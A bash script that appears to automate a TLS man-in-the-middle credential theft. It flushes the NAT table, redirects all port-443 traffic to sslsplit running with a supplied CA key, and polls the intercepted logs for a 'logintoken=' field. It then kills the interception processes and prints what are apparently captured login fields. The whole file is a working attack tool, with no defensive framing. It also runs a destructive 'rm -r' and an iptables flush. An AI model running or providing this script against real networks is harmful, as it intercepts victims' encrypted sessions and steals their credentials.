#!/bin/bash

rm -r ./logdir
mkdir logdir
touch sslsplit.pid
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443

sslsplit \
    -d \
    -S logdir/ \
    -k ca.key \
    -c ca.crt \
    -p sslsplit.pid \
    https 0.0.0.0 8443 

dir="./logdir"
fetched=0
info=""

while true
do 
    for entry in "$dir"/*
    do
        if test -f "$entry"
        then
            info=`cat $entry | grep "logintoken="`

            if [ "$info" = "" ]
            then 
                continue
            fi

            #echo $info
            fetched=1
            break

        else
            continue
        fi

    done

    if [ "$fetched" -eq 1 ]
    then
        break
    fi

done

pidfile="sslsplit.pid"

pid=`cat "$pidfile"`
kill $pid

mitm_pid="$1"
# echo $mitm_pid

echo "$info" | awk '{split($0,a,"&"); print a[2]; print a[3]}'
kill $mitm_pid